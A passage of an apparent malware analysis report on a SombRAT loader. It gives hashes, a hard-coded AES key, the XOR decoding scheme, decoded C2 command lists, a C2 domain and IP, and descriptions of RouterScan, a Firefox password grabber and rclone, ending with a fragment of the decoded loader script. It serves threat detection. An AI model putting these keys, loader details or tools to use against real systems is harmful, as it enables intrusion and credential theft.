a valid PE file.'\n\t\t\t}\n\n\t\t\tWrite-Host 4\n\n\t\t\tRemoteScriptBlock $FuncReturnType $ProcId $ProcName $ForceASLR\n\t\t\t---End Decoded Script Content---\n\n\t\t\tThe script will decode the content of WwanSvc.b (c5a1dbb49ff72a69ac7c52b18e57a21527bc381077b1cea12c3a40e9e98ae6cd) and then check to confirm that it has a valid PE header. The script will also check the system environment for a 64-bit architecture. The executable is not written to disk but loaded directly into memory.\n\n\nc5a1dbb49ff72a69ac7c52b18e57a21527bc381077b1cea12c3a40e9e98ae6cd\nTags\ndownloaderremote-access-trojanuploader\nDetails\n\n\n\nName\nWwanSvc.b\n\n\nSize\n706560 bytes\n\n\nType\ndata\n\n\nMD5\n27c1574b820350b191d9fba514d70720\n\n\nSHA1\n054ab4fd3a57436685e7067ff34b8efb45669fc6\n\n\nSHA256\nc5a1dbb49ff72a69ac7c52b18e57a21527bc381077b1cea12c3a40e9e98ae6cd\n\n\nSHA512\ne2445cf26c7b33bae91474246133d55ff67fa20acaa1c80c142e356b89927e4b0f9bd0a4ed82630919ddd56303030fb96c5187b27494a9a6aec0b8d57c4c404d\n\n\nssdeep\n12288:j5ql+KNySxRR0wsrddKHjNQRbYnBuBi4EwC+Qpho5IRgYh3bDhuVS91o63p002nV:FqlFBRty+GNiuB5qogbgW/002nV\n\n\nEntropy\n7.998041\n\n\nPath\nC:\\ProgramData\\Microsoft\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nRelationships\n\n\n\nc5a1dbb49f...\nUsed\nbfc50bf40aae3b41d77169fba45c332b8c60406b403af647f1bb083918a33b9e\n\n\nc5a1dbb49f...\nUsed\ndec8655cdd7214daf9579ef481d0b0c6ed8120c120d3bd8ec27cb6e1874eb291\n\n\n\nDescription\nThis artifact, when decoded, is a 64-bit variant of the SombRAT loader. The primary purpose of the loader is to allow a remote operator to securely download and load executable plugins on a target system. Given this plugin structure, the author can easily mold the RAT to provide additional functionalities and capabilities. The application contains two hard coded public RSA keys, which it will utilize to secure its command and control (C2) sessions with the remote operator. Static analysis indicates that the C2 communications will also be encrypted using Advanced Encryption Standard (AES) resulting in a secure Secure Sockets Layer (SSL) tunnel with the remote operator.\n\n\t\t\tThe configuration file, 59fb3174bb34e803 was also submitted for analysis. This file, located in C:\\ProgramData, contains data the malware requires at runtime, including the operator controlled remote C2 address. The malware decrypts this configuration file with the hard coded AES key \u2018ujnchdyfngtreaycnbjgi837157fncae\u2019. See Figure 1.\n\n\t\t\tThe malware contains numerous encoded strings, including an AES key that is used to decrypt the malware configuration file. The malware decrypts these strings by first XORing them with the first byte. The malware then decrypts the rest of the string by XORing it with the single byte XOR key 0xDE. This string can be decrypted by XORing the entire string with the value 0x78, and then XORing the result with 0xDE.\n\n\t\t\tThe RAT provides most of its C2 capabilities to the remote operator by allowing the remote operator to securely transfer executable dynamic-link library (DLL) plugins to the target system. This is done via a protected SSL session and load these plugins at will via the embedded plugin framework. The native malware itself does not provide much actual functionality to the operator without the code provided by the plugins. Some of the native functionality that the malware provides without the use of a plugin includes collecting system data such as computer name, user name, current process, operating system (OS) version, local system time, and current process that the malware is running as. The program also contains native C2 capabilities allowing it to communicate with the remote operator using an embedded SOCKS proxy or via domain name system (DNS) tunneling.\n\n\t\t\tThe malware does contain hard coded commands that it uses to evaluate against operator-provided data. These commands are encoded within the binary, and they are not encoded before being compared against operator-provided data \u2014indicating the malware expects the remote operator to encode the commands before passing them to the Remote Access Tool. Some of the decoded strings the malware uses during its C2 sessions are displayed below:\n\n\t\t\t---Begin Embedded Commands---\n\n\t\t\tsrubp || debug\n\t\t\t~yqxezvc~xyvttrgcrs || informationaccepted\n\t\t\t{xvsqexzq~{r || loadfromfile\n\t\t\tuexvstvdc || broadcast\n\t\t\tg{bp~yby{xvs || pluginunload\n\t\t\tv`v~cHprctxycryc || await_getcontent\n\t\t\tzxsb{rd{~dc || moduleslist\n\t\t\tyrc`xe|txyyrtcrs || networkconnected\n\t\t\tgextrddyvzr || processname\n\t\t\t|rn{xp || keylog\n\t\t\t{xvsqexzzrzxen || loadfrommemory\n\t\t\t~y~c~v{~mrvys{xvsg{bp~yunby~f~s || initializeandpluginbyuniqid\n\t\t\tprc~yqx || getinfo\n\t\t\tt{xdrvyssr{rcrdcxevpr || closeanddeletestorage\n\t\t\t{xvsg{bp~ytxzg{rcr || loadplugincomplete\n\t\t\t{xvsqexzdcxevpr || loadfromstorage\n\t\t\tvdnytrarycdtxbyc || asynceventscount\n\t\t\tyrc`xe|s~dtxyyrtcrs || networkdisconnected\n\t\t\tub~{sg{vcqxez || buildplatform\n\t\t\tsrdte~gcxedtxbyc || descriptorscount\n\t\t\tg{bp~y{xvstxzg{rcr || pluginloadcomplete\n\t\t\td.bcsx`y || shutdown\n\t\t\t{xvsvds{{ || loadasdll\n\t\t\tg{bp~yby{xvstxzg{rcr || pluginunloadcomplete\n\t\t\t~y}rtcxe || injecter\n\t\t\tby~ydcv{{ || uninstall\n\t\t\t`~yg{vcqxez || winplatform\n\t\t\ts{{q~{ryvzr || dllfilename\n\t\t\t~d`x`!# || iswow64\n\t\t\tdcxevprxgryreexe || storageopenerror\n\t\t\tdcxevprt{xdrs || storageclosed\n\t\t\tt{xdrdcxevpr || closestorage\n\t\t\terdrcdcxevpr || resetstorage\n\t\t\ttervcr || create\n\t\t\tbg{xvs || upload\n\t\t\tdcxevprxgryrs || storageopened\n\t\t\tsrubp{xp || debuglog\n\t\t\tprcgextrdd{~dc || getprocesslist\n\t\t\txgrydcxevpr || openstorage\n\t\t\tt{rvev{{ || clearall\n\t\t\tdcxevprt{xdrreexe || storagecloseerror\n\t\t\tsr{rcrxydbttrdd || deleteonsuccess\n\t\t\tgextrdd{~dc || processlist\n\t\t\t|~{{gextrddung~s || killprocessbypid\n\t\t\t|~{{gextrddunyvzr || killprocessbyname\n\n\t\t\t---End Embedded Commands---\n\n\t\t\tMany of the commands from the embedded proxy were also decoded. The following is a sample of the decoded commands:\n\n\t\t\t---Begin Decoded Proxy Commands---\n\n\t\t\tprctxycryc || getcontent\n\t\t\tgexongxec || proxyport\n\t\t\tertxyyrtc || reconnect\n\t\t\tgexonsxzv~y || proxydomain\n\t\t\terdrcgexon || resetproxy\n\t\t\tgexonbdre || proxyuser\n\t\t\tdrcgexon || setproxy\n\t\t\tgexoncngr || proxytype\n\t\t\tertauncrd || recvbytes\n\t\t\td`~ct.cxsyd || switchtodns\n\t\t\ts~dtxyyrtc || disconnect\n\t\t\tprcgexon || getproxy\n\t\t\td`~ct.cxctg || switchtotcp\n\n\t\t\t---End Decoded Proxy Commands---\n\n\t\t\tThe malware also contains an encoded note presumably designed for malware analysts whom analyze the code. Translation is \"Nobody's perfect but me.\" See Figure 2.\nScreenshots\n \n\nFigure 2. - \n\n \n\nFigure 1. - \n\n\n\na7f5097c0d991c9bbd5f2694ec8c9b484e2ab583d362c42c30556f1271cc8aaa\nTags\nloaderobfuscated\nDetails\n\n\n\nName\nWwanSvc.a__2\n\n\nSize\n256 bytes\n\n\nType\ndata\n\n\nMD5\ne4c3fff8caedf0ecf6c88d6566e5bbbc\n\n\nSHA1\n6aacdcba1a6e645ef51bd78b080b14482593f985\n\n\nSHA256\na7f5097c0d991c9bbd5f2694ec8c9b484e2ab583d362c42c30556f1271cc8aaa\n\n\nSHA512\n51c37f58074b143b1ba57564134569a91b2e978b6ab704262f12f77c49b08ed47e46111b06da26e3ce1abe374da3d5d2d65dbe12a7b738b3280152cdeadc7694\n\n\nssdeep\n6:0lTfidEojQg4KBACrBzMmp599q7ATeha0RuvsCeBtGJ0/NM06MOqsvb:YUxtACxRBqU6ha0YvsCGo06MOqib\n\n\nEntropy\n8.000000\n\n\nPath\nC:\\ProgramData\\Microsoft\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nRelationships\n\n\n\na7f5097c0d...\nRelated_To\n911a88fe16efca24206f1786242615596e67a9336bc670c1e44a33727987d886\n\n\na7f5097c0d...\nRelated_To\nc0a214a60daac6f0ba01ce9128d42bb2d8e81909f4b87963de340ab8627a6b0b\n\n\n\nDescription\nThis artifact contains a 256 byte key that is used by the base64 encoded script in WwanSvc.txt to decode a new PowerShell script in WwanSvc.c_2. The key is also used to decode the reflectively loaded payload in WwanSvc.b_2.\n\n\n911a88fe16efca24206f1786242615596e67a9336bc670c1e44a33727987d886\nTags\nfile-lessloaderobfuscated\nDetails\n\n\n\nName\nWwanSvc.c__2\n\n\nSize\n121572 bytes\n\n\nType\ndata\n\n\nMD5\n70817c4ec5e11736e0cfee5d10eb7fd5\n\n\nSHA1\na29d2e4b55bf9919912a52d44931e17c073428a2\n\n\nSHA256\n911a88fe16efca24206f1786242615596e67a9336bc670c1e44a33727987d886\n\n\nSHA512\nb44e21ef7b205d2b39e86440adb8542383d878b0cb3d059654c07573d37f281eb7e627b17a2707fa0ad0c6e04f3e16a36a9248fb7e7223064453279aeaefeda3\n\n\nssdeep\n3072:CZOS7EuckzCINqSz+T4XgeW02d7XYHX4Ll7:YouBTUT4ge2d7o349\n\n\nEntropy\n7.998462\n\n\nPath\nC:\\ProgramData\\Microsoft\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nRelationships\n\n\n\n911a88fe16...\nRelated_To\na7f5097c0d991c9bbd5f2694ec8c9b484e2ab583d362c42c30556f1271cc8aaa\n\n\n\nDescription\nThe decoded content of this artifact is identical to the content found in WwanSvc.c. The file has been XOR encoded using the 256 byte found in WwanSvc.a_2.\n\n\nc0a214a60daac6f0ba01ce9128d42bb2d8e81909f4b87963de340ab8627a6b0b\nTags\ndownloaderremote-access-trojanuploader\nDetails\n\n\n\nName\nWwanSvc.b__2\n\n\nSize\n701952 bytes\n\n\nType\ndata\n\n\nMD5\n5995868461ab50df049438a6aade7481\n\n\nSHA1\nc9fab63ec0d603197d18ce90f34e7af73f9e7679\n\n\nSHA256\nc0a214a60daac6f0ba01ce9128d42bb2d8e81909f4b87963de340ab8627a6b0b\n\n\nSHA512\n177c9ce930d210b08741e3c39189ff3511137421921310630a5fae7942e89e53ee8a5c473ff9c40b8e5bbe2fcf43f66c76881314d20bce7320583b74b6700adb\n\n\nssdeep\n12288:Si5Pge+HQa6GVJdX3J58QpweBrFdkfPO4eijQYUKnJqUE0:Si5PAQa6GZ5pwSOfB3QYBJqC\n\n\nEntropy\n7.998112\n\n\nPath\nC:\\ProgramData\\Microsoft\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nRelationships\n\n\n\nc0a214a60d...\nRelated_To\na7f5097c0d991c9bbd5f2694ec8c9b484e2ab583d362c42c30556f1271cc8aaa\n\n\n\nDescription\nThis artifact is identical to c5a1dbb49ff72a69ac7c52b18e57a21527bc381077b1cea12c3a40e9e98ae6cd detailed in this report. The RAT has been obfuscated using the XOR key from a7f5097c0d991c9bbd5f2694ec8c9b484e2ab583d362c42c30556f1271cc8aaa also in this report.\n\n\nbfc50bf40aae3b41d77169fba45c332b8c60406b403af647f1bb083918a33b9e\nDetails\n\n\n\nName\n59fb3174bb34e803\n\n\nSize\n384 bytes\n\n\nType\ndata\n\n\nMD5\n440a5d706ee43959434d0f78758d94a0\n\n\nSHA1\nbd3d107f8016bb249623033745fc8ce34807590b\n\n\nSHA256\nbfc50bf40aae3b41d77169fba45c332b8c60406b403af647f1bb083918a33b9e\n\n\nSHA512\n365b39e6b0745167ab04eb699c39031ea076b9d634d6943fc66d9936448b8c4cd0f191aac5709ed6c3adf89ae492fa6cbcedd157a22e24d36f048804c24d15f3\n\n\nssdeep\n6:SFrUf9Ad4khJDJuvfExTo44Rw8c5CsU+C1SSmwUN0KcsG+u5hhaIUrDJfAtZ5/HM:arG1khJDIeo44R1c5C1+C1/hUcsvkHGj\n\n\nEntropy\n7.421853\n\n\nPath\nC:\\ProgramData\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nRelationships\n\n\n\nbfc50bf40a...\nConnected_To\nfeticost.com\n\n\nbfc50bf40a...\nUsed_By\nc5a1dbb49ff72a69ac7c52b18e57a21527bc381077b1cea12c3a40e9e98ae6cd\n\n\n\nDescription\nThis artifact is an encrypted configuration file that is read by the WwanSvc program. The configuration file contains the hardcoded domain, feticost.com. The program attempts DNS queries for this domain prepending a third level domain that consists of seven to nine random hexidecimal characters, e.g. bb95058f1.feticost.com.\n\n\nfeticost.com\nTags\ncommand-and-control\nWhois\nDomain Name: FETICOST.COM\n\t\t\tRegistry Domain ID: 2573255396_DOMAIN_COM-VRSN\n\t\t\tRegistrar WHOIS Server: whois.tucows.com\n\t\t\tRegistrar URL: http://www.tucows.com\n\t\t\tUpdated Date: 2021-02-18T19:23:17Z\n\t\t\tCreation Date: 2020-11-18T20:57:21Z\n\t\t\tRegistry Expiry Date: 2021-11-18T20:57:21Z\n\t\t\tRegistrar: Tucows Domains Inc.\n\t\t\tRegistrar IANA ID: 69\n\t\t\tRegistrar Abuse Contact Email:\n\t\t\tRegistrar Abuse Contact Phone:\n\t\t\tDomain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited\n\t\t\tDomain Status: clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited\n\t\t\tName Server: NS1.FETICOST.COM\n\t\t\tName Server: NS2.FETICOST.COM\n\t\t\tDNSSEC: unsigned\n\n\t\t\tDomain Name: FETICOST.COM\n\t\t\tRegistry Domain ID: 2573255396_DOMAIN_COM-VRSN\n\t\t\tRegistrar WHOIS Server: whois.tucows.com\n\t\t\tRegistrar URL: http://tucowsdomains.com\n\t\t\tUpdated Date: 2021-02-18T19:23:16\n\t\t\tCreation Date: 2020-11-18T20:57:21\n\t\t\tRegistrar Registration Expiration Date: 2021-11-18T20:57:21\n\t\t\tRegistrar: TUCOWS, INC.\n\t\t\tRegistrar IANA ID: 69\n\t\t\tDomain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited\n\t\t\tDomain Status: clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited\n\t\t\tRegistry Registrant ID:\n\t\t\tRegistrant Name: REDACTED FOR PRIVACY\n\t\t\tRegistrant Organization: REDACTED FOR PRIVACY\n\t\t\tRegistrant Street: REDACTED FOR PRIVACY\n\t\t\tRegistrant City: REDACTED FOR PRIVACY\n\t\t\tRegistrant State/Province: Charlestown\n\t\t\tRegistrant Postal Code: REDACTED FOR PRIVACY\n\t\t\tRegistrant Country: KN\n\t\t\tRegistrant Phone: REDACTED FOR PRIVACY\n\t\t\tRegistrant Phone Ext:\n\t\t\tRegistrant Fax: REDACTED FOR PRIVACY\n\t\t\tRegistrant Fax Ext:\n\t\t\tRegistrant Email: https://tieredaccess.com/contact/1c4c43bb-ee8a-433e-9a77-71a4c740da84\n\t\t\tRegistry Admin ID:\n\t\t\tAdmin Name: REDACTED FOR PRIVACY\n\t\t\tAdmin Organization: REDACTED FOR PRIVACY\n\t\t\tAdmin Street: REDACTED FOR PRIVACY\n\t\t\tAdmin City: REDACTED FOR PRIVACY\n\t\t\tAdmin State/Province: REDACTED FOR PRIVACY\n\t\t\tAdmin Postal Code: REDACTED FOR PRIVACY\n\t\t\tAdmin Country: REDACTED FOR PRIVACY\n\t\t\tAdmin Phone: REDACTED FOR PRIVACY\n\t\t\tAdmin Phone Ext:\n\t\t\tAdmin Fax: REDACTED FOR PRIVACY\n\t\t\tAdmin Fax Ext:\n\t\t\tAdmin Email: REDACTED FOR PRIVACY\n\t\t\tRegistry Tech ID:\n\t\t\tTech Name: REDACTED FOR PRIVACY\n\t\t\tTech Organization: REDACTED FOR PRIVACY\n\t\t\tTech Street: REDACTED FOR PRIVACY\n\t\t\tTech City: REDACTED FOR PRIVACY\n\t\t\tTech State/Province: REDACTED FOR PRIVACY\n\t\t\tTech Postal Code: REDACTED FOR PRIVACY\n\t\t\tTech Country: REDACTED FOR PRIVACY\n\t\t\tTech Phone: REDACTED FOR PRIVACY\n\t\t\tTech Phone Ext:\n\t\t\tTech Fax: REDACTED FOR PRIVACY\n\t\t\tTech Fax Ext:\n\t\t\tTech Email: REDACTED FOR PRIVACY\n\t\t\tName Server: ns1.feticost.com\n\t\t\tName Server: ns2.feticost.com\n\t\t\tDNSSEC: unsigned\nRelationships\n\n\n\nfeticost.com\nConnected_From\nbfc50bf40aae3b41d77169fba45c332b8c60406b403af647f1bb083918a33b9e\n\n\nfeticost.com\nResolved_To\n51.89.50.152\n\n\n\nDescription\nThe file 59fb3174bb34e803 attempted to connect to the IP address at the time of analysis.\n\n\n51.89.50.152\nRelationships\n\n\n\n51.89.50.152\nResolved_To\nfeticost.com\n\n\n\nDescription\nAt the time of analysis the domain feticost.com resolved to this IP address.\n\n\n18229920a45130f00539405fecab500d8010ef93856e1c5bcabf5aa5532b3311\nTags\nreconnaissance\nDetails\n\n\n\nName\nRouterScan.exe\n\n\nSize\n2807808 bytes\n\n\nType\nPE32 executable (GUI) Intel 80386, for MS Windows\n\n\nMD5\n9cfd524557c76097bbf6cf493b351a04\n\n\nSHA1\nae16aea46540f2013c92e2a9ba3310824c949554\n\n\nSHA256\n18229920a45130f00539405fecab500d8010ef93856e1c5bcabf5aa5532b3311\n\n\nSHA512\n1ea7e45129cbe508a7fdf43ed76add82cabaa1ef75bc492f7fb6e373c4a2af3d7b3014000dbfc544c8a8dba469a1d165d3ad99bd4cf6a538f1bba462eda91561\n\n\nssdeep\n49152:jBFDCgg0ISOvxXI0cpb4NGvFILfGBRysfTuTP3:jX4xI0gvFrBRy/3\n\n\nEntropy\n6.569284\n\n\n\nAntivirus\n\n\n\nMcAfee\nGenericRXNT-SV!9CFD524557C7\n\n\n\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nPE Metadata\n\n\n\nCompile Date\n2020-10-18 13:22:11-04:00\n\n\nImport Hash\ndb0d6c362bcdb15cb58ca00d4881514f\n\n\nCompany Name\nStas'M Corp.\n\n\nFile Description\nRouter Scan by Stas'M\n\n\nInternal Name\nRouter Scan\n\n\nLegal Copyright\nCopyright \u00a9 Stas'M Corp. 2020\n\n\nOriginal Filename\nRouterScan.exe\n\n\nProduct Name\nRouter Scan by Stas'M\n\n\nProduct Version\n2.6.0.0\n\n\n\nPE Sections\n\n\n\nMD5\nName\nRaw Size\nEntropy\n\n\n06641923d8930b820ae0fa2744ffbfce\nheader\n1024\n2.503522\n\n\ncefdcb37a37e2c0d08f51b64b7725a9f\n.text\n2202624\n6.336674\n\n\n710055abcb0a0e06b57618351d043d7b\n.itext\n7680\n6.007764\n\n\nb5c7525826eacee1f3c9cde60af087af\n.data\n59904\n5.974659\n\n\nd41d8cd98f00b204e9800998ecf8427e\n.bss\n0\n0.000000\n\n\n81b3c32719fa3be1b1be9d29173d1e0f\n.idata\n16384\n5.151731\n\n\nf0a26ffcf00e65e34c3a9e5a2876c722\n.didata\n1024\n3.607385\n\n\nd41d8cd98f00b204e9800998ecf8427e\n.tls\n0\n0.000000\n\n\na25cceaee97599dd7fb13cc3ecb3f744\n.rdata\n512\n0.210826\n\n\n11cb8b70eea47fc8d6855bd177f8a71c\n.reloc\n171520\n6.706152\n\n\n1deda5de7f7cb7e571031b2163a9b359\n.rsrc\n347136\n6.750274\n\n\n\nPackers/Compilers/Cryptors\n\n\n\nBobSoft Mini Delphi -> BoB / BobSoft\n\n\n\nDescription\nThis artifact is Router Scan v2.60 by Stas,M. This utility is used to identify network routers and proxy servers on a network. The latest release of this program (v2.60) contains a list of common admin names and passwords that can be used for a dictionary attack to gain access to a network router. The program also contains code to identify common vulnerabilities and leverage exploits against many popular routers. The program can be customized to scan any subnet, any particular port, or protocol. The latest version also contains software to scan for wireless network access points. To execute this program, two libraries are required: librouter.dll and libeay32.dll. Upon execution, the program will generate several telemetry files that are dropped in the current directory. These files are named RouterScan.log, Config.ini, filter.txt, exclusions.txt, ports.txt, and ranges.txt.\nScreenshots\n \n\nFigure 3. - \n\n\n\n7d57e0ba8b36ec221b16807ce4e13a1125d53922fa50c3827a5ebd6811736ffd\nTags\ncredential-harvestertrojan\nDetails\n\n\n\nName\ngrabff.exe\n\n\nSize\n7680 bytes\n\n\nType\nPE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows\n\n\nMD5\n4d3d3919dda002511e03310c49b7b47f\n\n\nSHA1\nb16a1eb8bc2e5d4ded04bfaa9ee2b861ead143ba\n\n\nSHA256\n7d57e0ba8b36ec221b16807ce4e13a1125d53922fa50c3827a5ebd6811736ffd\n\n\nSHA512\nc9479a4e25fadfb0135bfa69e3da3d8f1aeffe6e4bc1a2797a59dcbb03ef24f16471577f1223d56d9b5a4efc53a7056aecef4100da8316d603e6f6b4abfeac9c\n\n\nssdeep\n96:SUAX6SDdzEtOjmbUgvuNixSo+P1VP1ZLYttKftddvzNt:1ANEtOjmoNkPA1pYttKVX5\n\n\nEntropy\n4.596081\n\n\n\nAntivirus\n\n\n\nAhnlab\nTrojan/Win.MSIL\n\n\nAvira\nTR/Agent.wzlfi\n\n\nBitdefender\nTrojan.GenericKD.46215542\n\n\nEmsisoft\nTrojan.GenericKD.46215542 (B)\n\n\nK7\nRiskware ( 0040eff71 )\n\n\nLavasoft\nTrojan.GenericKD.46215542\n\n\nMcAfee\nRDN/Generic.dx\n\n\nNANOAV\nTrojan.Win32.Stealer.iuvcng\n\n\n\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nPE Metadata\n\n\n\nCompile Date\n2089-03-19 14:11:14-04:00\n\n\nImport Hash\nf34d5f2d4577ed6d9ceec516c1f5a744\n\n\nFile Description\ngrabff\n\n\nInternal Name\ngrabff.exe\n\n\nLegal Copyright\nCopyright \u00a9 2020\n\n\nOriginal Filename\ngrabff.exe\n\n\nProduct Name\ngrabff\n\n\nProduct Version\n1.0.0.0\n\n\n\nPE Sections\n\n\n\nMD5\nName\nRaw Size\nEntropy\n\n\nb203efaadd0c4f2ecd98c9b8a0b19d17\nheader\n512\n2.602195\n\n\neaf514816a407e08363e07afe7542382\n.text\n5120\n5.077952\n\n\n9b966fca775229b7005842be47aa73e9\n.rsrc\n1536\n4.034473\n\n\n6e567d7047b8f05a0725da27ffbb2abd\n.reloc\n512\n0.081539\n\n\n\nPackers/Compilers/Cryptors\n\n\n\nMicrosoft Visual C# v7.0 / Basic .NET\n\n\n\nDescription\nThis artifact is a 32-bit .NET executable called grabff. The program uses a command line interface to extract Firefox stored passwords and authentication information from the user's profile located at C:\\Users\\<user>\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles. The program will extract the password databases found in key3.db, key4.db, and logins.json as well as the sqlite-based certificate database, cert9.db. The data can be copied to any designated directory.\n\n\n495a0ccc38fb8f22b48025f030617978cf5fdc3df3fed32b1410ad47747ae177\nTags\nutility\nDetails\n\n\n\nName\nrclone.exe\n\n\nSize\n39144960 bytes\n\n\nType\nPE32+ executable (console) x86-64 (stripped to external PDB), for MS Windows\n\n\nMD5\nabb0fbecd6ac93d3271fc34269a1fb68\n\n\nSHA1\nfc09069b25f42cb8dc6960eea76980a0ea8a768c\n\n\nSHA256\n495a0ccc38fb8f22b48025f030617978cf5fdc3df3fed32b1410ad47747ae177\n\n\nSHA512\nc921aa311d4096accb4e10b9c16d947acfe7828afd3c5b94a0bf1059300434751df440e5a85427e47540b06d368f777891abdd6b6090e358262a0c0574f0a876\n\n\nssdeep\n196608:7j2z/byHB8rHbHUaAc6R9PFvQ3Ko7OGu5Dt57q4EQGXyc9+sVK5jAgcb5n1cHYft:suh0Unq3oDkdz\n\n\nEntropy\n5.895969\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nPE Metadata\n\n\n\nCompile Date\n2020-06-10 11:26:48-04:00\n\n\nImport Hash\nf92b8a691e76b8843c69dd59c9dac4dc\n\n\n\nPE Sections\n\n\n\nMD5\nName\nRaw Size\nEntropy\n\n\n543b66d31974c0e65d15a31ae7930593\nheader\n1024\n2.499329\n\n\nf22b28d6d68881e9c85cb7c4224bc09b\n.text\n17408512\n5.719293\n\n\n827f84c9da5b7418978f9b5476cdbfec\n.data\n636416\n5.201837\n\n\n3f9f9088ac374ea51759bdcbc4b78a76\n.rdata\n21090816\n5.390432\n\n\nf0ac7ba71448f1ff46ba958bf58d5c81\n.pdata\n1536\n5.273794\n\n\n3c41e0fecd0137e76631b5a2cb2996aa\n.xdata\n1536\n3.739931\n\n\nd41d8cd98f00b204e9800998ecf8427e\n.bss\n0\n0.000000\n\n\n2d2d0405cfa0f1a49949a4712ef6dbb2\n.idata\n4096\n4.417682\n\n\n4e35d3b10dfa07e092a95be05d663be7\n.CRT\n512\n0.332025\n\n\nbf619eac0cdf3f68d496ea9344137e8b\n.tls\n512\n0.000000\n\n\n\nPackers/Compilers/Cryptors\n\n\n\nMicrosoft Visual C++ 8.0 (DLL)\n\n\n\nDescription\nThis artifact is an open-source cloud content management program called RClone. The program uses a command line interface to manage files in cloud storage. The program is capable of uploading and downloading files, verifying file integrity, and providing file encryption. The program can use any of the following protocols: SSH File Transfer Protocol (SFTP), Web Distributed Authoring and Versioning (WebDAV), File Transfer Protocol (FTP), and Digital Living Network Alliance (DLNA).\nScreenshots\n \n\nFigure 4. - \n\n\n\n5f312e137beb1ce75f8fdf03a59e1b3cba3dc57ccc16e48daee3ee52c08fa149\nTags\ndownloadertrojanuploader\nDetails\n\n\n\nName\ns3browser-9-5-3.exe\n\n\nSize\n3429408 bytes\n\n\nType\nPE32 executable (GUI) Intel 80386, for MS Windows\n\n\nMD5\ne0c3c5376abe535e255bd8893540abc4\n\n\nSHA1\nf9667504eb648527038adc3932d4c5b7c8443a65\n\n\nSHA256\n5f312e137beb1ce75f8fdf03a59e1b3cba3dc57ccc16e48daee3ee52c08fa149\n\n\nSHA512\nc3b024d5fe1b3b2d5c8712057b320eaf6e02c88bc9a478319821c52197fba39f20c2983a510e58962155f9678cfcc2e29eaeb08115421f93385c25f9d2cb5df2\n\n\nssdeep\n49152:IZ00AYLQ+Vf1XvOZK1zeeEHVOx43F4uLHX28gw20DxpPva8FAkyflqnLSKhj0T:RtYLTrW5HmUST826pPvaup8lqLxjy\n\n\nEntropy\n7.986284\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nPE Metadata\n\n\n\nCompile Date\n2016-04-06 10:39:04-04:00\n\n\nImport Hash\n20dd26497880c05caed9305b3c8b9109\n\n\nCompany Name\nNetSDK Software\n\n\nFile Description\nS3 Browser version 9.5.3\n\n\nInternal Name\nNone\n\n\nLegal Copyright\nCopyright \u00a9 2008-2021 NetSDK Software\n\n\nOriginal Filename\nNone\n\n\nProduct Name\nS3 Browser\n\n\nProduct Version\n9.5.3.0\n\n\n\nPE Sections\n\n\n\nMD5\nName\nRaw Size\nEntropy\n\n\needf003e53c9d35595d518b33fd7370c\nheader\n1024\n2.142591\n\n\na33e9ff7181115027d121cd377c28c8f\n.text\n62464\n6.375214\n\n\ncaec456c18277b579a94c9508daf36ec\n.itext\n4096\n5.732201\n\n\n746954890499546d73dce0e994642192\n.data\n3584\n2.296721\n\n\nd41d8cd98f00b204e9800998ecf8427e\n.bss\n0\n0.000000\n\n\ne9b9c0328fd9628ad4d6ab8283dcb20e\n.idata\n4096\n4.597813\n\n\nd41d8cd98f00b204e9800998ecf8427e\n.tls\n0\n0.000000\n\n\n3dffc444ccc131c9dcee18db49ee6403\n.rdata\n512\n0.204488\n\n\n6cb3466e71bb5ddd04517a59ca7f6153\n.rsrc\n45568\n4.145160\n\n\n\nPackers/Compilers/Cryptors\n\n\n\nBorland Delphi 4.0\n\n\n\nDescription\nThis artifact is the free version of the S3 Browser program used to upload and download data from a cloud account. The program can fully configure a cloud account, modify Hypertext Transfer Protocol (HTTP) headers and object tags, enable multiple simultaneous uploads and downloads, and provide server side encryption. By default, the installed components of the program are stored in the path C:\\Program Files\\S3 Browser. Activity logs are created on a daily basis and are stored in the path C:\\Users\\<user>\\AppData\\Roaming\\S3Browser\\logs in the format 's3browser-win32-YYYY-MM-DD-log.txt'.\nScreenshots\n \n\nFigure 5. - \n\n\nRelationship Summary\n\n\n\n\na710f573f7...\nCreated\ne4b67b8ffcc1ed95d3ff26622ab4c67a329f76bd76d0f523f5986e67969354b7\n\n\na710f573f7...\nRelated_To\n5608c12872229acd84f33bf6c667a1b43d112594b2b5f47f923d631bcce6090c\n\n\ne4b67b8ffc...\nCreated_By\na710f573f73c163d54c95b4175706329db3ed89cd9337c583d0bb24b6a384789\n\n\n5608c12872...\nRelated_To\na710f573f73c163d54c95b4175706329db3ed89cd9337c583d0bb24b6a384789\n\n\nccacf4658a...\nUsed\n4de1bd4b1bb28ed0897b9d3c5d16a4b1442c7f53cb389cbed82af189696d3f40\n\n\n4de1bd4b1b...\nUsed\ndec8655cdd7214daf9579ef481d0b0c6ed8120c120d3bd8ec27cb6e1874eb291\n\n\n4de1bd4b1b...\nUsed\nd3d5e5a8a40f34fc8d89b2d74d89a4b101d8b95a79e990e3b4161282aa6aca32\n\n\n4de1bd4b1b...\nUsed_By\nccacf4658ae778d02e4e55cd161b5a0772eb8b8eee62fed34e2d8f11db2cc4bc\n\n\ndec8655cdd...\nUsed_By\n4de1bd4b1bb28ed0897b9d3c5d16a4b1442c7f53cb389cbed82af189696d3f40\n\n\ndec8655cdd...\nUsed_By\nc5a1dbb49ff72a69ac7c52b18e57a21527bc381077b1cea12c3a40e9e98ae6cd\n\n\nd3d5e5a8a4...\nUsed_By\n4de1bd4b1bb28ed0897b9d3c5d16a4b1442c7f53cb389cbed82af189696d3f40\n\n\nc5a